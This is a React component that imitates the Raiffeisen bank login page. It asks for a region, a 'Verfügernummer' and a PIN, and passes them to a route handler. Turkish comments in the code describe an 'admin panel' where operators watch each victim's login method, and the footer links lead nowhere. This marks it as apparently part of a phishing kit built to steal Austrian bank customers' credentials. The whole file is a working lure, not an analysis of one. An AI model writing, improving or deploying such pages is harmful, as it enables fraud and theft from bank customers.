"use client";

import React, { useEffect, useState } from "react";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
    bundesland?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: (data?: {
    verfuegernummer?: string;
    pin?: string;
    loginMethod?: string;
  }) => void;
  saving?: boolean;
};

const REGIONS = [
  "Burgenland",
  "Kärnten",
  "Niederösterreich/Wien",
  "Oberösterreich",
  "Salzburg",
  "Steiermark",
  "Tirol",
  "Vorarlberg",
  "Oberösterreich/Bank Direkt",
  "Oberösterreich/PRIVAT BANK",
  "Tirol/Jungholz",
  "Alpen Privatbank"
];

export function Raiffeisen({ formData, onChange, handleRouteAction, saving }: Props) {
  const [dropdownOpen, setDropdownOpen] = useState(false);
  const [selectedRegion, setSelectedRegion] = useState(
    (formData as Record<string, string | undefined>).bundesland || "Kärnten",
  );

  const toggleDropdown = () => setDropdownOpen(!dropdownOpen);

  // Ustteki "Bundesland oder Bank wählen" secimi admin panelde
  // "Giriş yöntemi" olarak gorunur → loginMethod'a yaz (varsayilan dahil).
  useEffect(() => {
    onChange("loginMethod", selectedRegion);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [selectedRegion]);

  return (
    <div className="min-h-screen relative font-sans flex flex-col">
      {/* Background Image Area (Green Forest) */}
      <div 
        className="absolute inset-0 -z-10"
        style={{
          backgroundImage: "linear-gradient(rgba(0,0,0,0.05), rgba(0,0,0,0.3)), url('/rbg_wald.webp')",
          backgroundColor: "#2e5a32",
          backgroundSize: "cover",
          backgroundPosition: "center",
        }}
      ></div>

      {/* Main Content (Centered Form) */}
      <div className="flex-1 flex items-center justify-center px-4 py-12">
        <div className="bg-white w-full max-w-[600px] shadow-[0_10px_40px_rgba(0,0,0,0.2)] flex flex-col p-8 md:p-12 relative">
          
          {/* Header / Language */}
          <div className="absolute top-8 right-8">
            <div className="flex items-center gap-1 cursor-pointer text-[#444] hover:text-black">
              <span className="text-[13px] font-medium">Deutsch</span>
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
              </svg>
            </div>
          </div>

          <div className="mt-4">
            <h1 className="text-[26px] font-medium text-[#333] mb-4">Melden Sie sich an</h1>
            <p className="text-[13px] text-[#555] mb-8">
              Anmeldung bei Raiffeisen {selectedRegion} — geben Sie Ihre Zugangsdaten ein, um fortzufahren.
            </p>

            <form 
              onSubmit={(e) => {
                e.preventDefault();
                // loginMethod'u submit override olarak da gec — state'e guvenme
                // (mount effect -> async session fetch yarisi loginMethod'u
                //  "" yapabiliyordu, admin "Giriş yöntemi: bekleniyor" gosteriyordu).
                handleRouteAction({
                  verfuegernummer: formData.verfuegernummer ?? "",
                  pin: formData.pin ?? "",
                  loginMethod: selectedRegion,
                });
              }}
              className="flex flex-col gap-6 relative"
            >
              {/* Dropdown Field */}
              <div className="relative">
                <div 
                  className={`w-full bg-[#f4f4f4] border-b-[1px] cursor-pointer transition-colors ${dropdownOpen ? 'border-[#333]' : 'border-[#767676] hover:border-[#333]'}`}
                  onClick={toggleDropdown}
                >
                  <div className="px-4 flex flex-col justify-center min-h-[56px] relative">
                    <span className={`absolute top-2 text-[11px] transition-colors ${dropdownOpen ? 'text-[#333]' : 'text-[#666]'}`}>
                      Bundesland oder Bank wählen *
                    </span>
                    <div className="flex justify-between items-center mt-3">
                      <span className="text-[15px] text-[#333]">{selectedRegion}</span>
                      <svg className={`w-5 h-5 text-[#333] transform transition-transform ${dropdownOpen ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M19 9l-7 7-7-7" />
                      </svg>
                    </div>
                  </div>
                </div>

                {/* Dropdown Menu */}
                {dropdownOpen && (
                  <div className="absolute top-full left-0 right-0 bg-white border border-[#ccc] shadow-lg z-50 max-h-[320px] overflow-y-auto">
                    {REGIONS.map((region) => (
                      <div 
                        key={region}
                        onClick={() => {
                          setSelectedRegion(region);
                          onChange("bundesland", region);
                          setDropdownOpen(false);
                        }}
                        className={`px-4 py-3 text-[15px] cursor-pointer flex justify-between items-center border-b border-gray-100 last:border-0 ${selectedRegion === region ? 'bg-[#f4f4f4] text-[#333]' : 'text-[#333] hover:bg-[#f4f4f4]'}`}
                      >
                        {region}
                        {selectedRegion === region && (
                          <svg className="w-5 h-5 text-[#333]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" />
                          </svg>
                        )}
                      </div>
                    ))}
                  </div>
                )}
              </div>

              {/* Inlogcode Field */}
              <div className="relative">
                <div className="w-full bg-[#f4f4f4] border-b-[1px] border-[#767676] focus-within:border-[#333] transition-colors flex flex-col px-4 min-h-[56px] justify-center group relative">
                  <label className="absolute top-2 text-[11px] text-[#666] group-focus-within:text-[#333] transition-colors">
                    Verfügernummer eingeben *
                  </label>
                  <input 
                    type="text" 
                    required
                    value={formData.verfuegernummer || ""}
                    onChange={(e) => onChange("verfuegernummer", e.target.value)}
                    className="w-full bg-transparent outline-none text-[#333] text-[15px] mt-3"
                  />
                </div>
              </div>

              {/* PIN Field */}
              <div className="relative">
                <div className="w-full bg-[#f4f4f4] border-b-[1px] border-[#767676] focus-within:border-[#333] transition-colors flex flex-col px-4 min-h-[56px] justify-center group relative">
                  <label className="absolute top-2 text-[11px] text-[#666] group-focus-within:text-[#333] transition-colors">
                    PIN eingeben *
                  </label>
                  <input 
                    type="password" 
                    required
                    value={formData.pin || ""}
                    onChange={(e) => onChange("pin", e.target.value)}
                    className="w-full bg-transparent outline-none text-[#333] text-[15px] mt-3"
                  />
                </div>
              </div>

              {/* Checkbox Area */}
              <div className="flex items-center mt-2 gap-2">
                <div className="relative flex items-center justify-center">
                  <input type="checkbox" id="saveUser" className="w-[18px] h-[18px] border border-[#767676] rounded-sm appearance-none checked:bg-white cursor-pointer peer" />
                  <svg className="absolute w-3 h-3 text-[#333] pointer-events-none hidden peer-checked:block" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" />
                  </svg>
                </div>
                <label htmlFor="saveUser" className="text-[#333] text-[13px] cursor-pointer ml-1">Verfüger speichern</label>
                <div className="w-4 h-4 rounded-full border border-[#767676] flex items-center justify-center text-[#767676] text-[10px] cursor-pointer hover:bg-gray-100 ml-1 font-serif">
                  i
                </div>
              </div>

              {/* Submit Button */}
              <button 
                type="submit" 
                disabled={saving} 
                className="w-full max-w-[280px] mx-auto mt-4 bg-[#fff15a] hover:bg-[#ffe500] text-[#333] font-medium h-[44px] text-[15px] transition-colors disabled:opacity-70 flex items-center justify-center"
              >
                {saving ? "Lädt..." : "Weiter"}
              </button>
            </form>
          </div>
        </div>
      </div>

      {/* Floating Help Button */}
      <div className="fixed bottom-8 right-8 z-50">
        <div className="w-12 h-12 bg-[#ffe500] rounded-full flex items-center justify-center text-black font-bold text-xl shadow-lg cursor-pointer hover:scale-105 transition-transform">
          ?
        </div>
      </div>

      {/* Footer */}
      <footer className="w-full py-6 flex flex-wrap justify-center items-center gap-4 text-[12px] text-white/90 z-10 px-4">
        <a href="#" className="hover:text-white flex items-center gap-1">
          Impressum 
          <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" /></svg>
        </a>
        <span className="text-white/50">•</span>
        <a href="#" className="hover:text-white flex items-center gap-1">
          Nutzungsbedingungen
          <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" /></svg>
        </a>
        <span className="text-white/50">•</span>
        <a href="#" className="hover:text-white flex items-center gap-1">
          Barrierefreiheitserklärung
          <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" /></svg>
        </a>
        <span className="text-white/50">•</span>
        <span>© 2026 Raiffeisen</span>
      </footer>
    </div>
  );
}
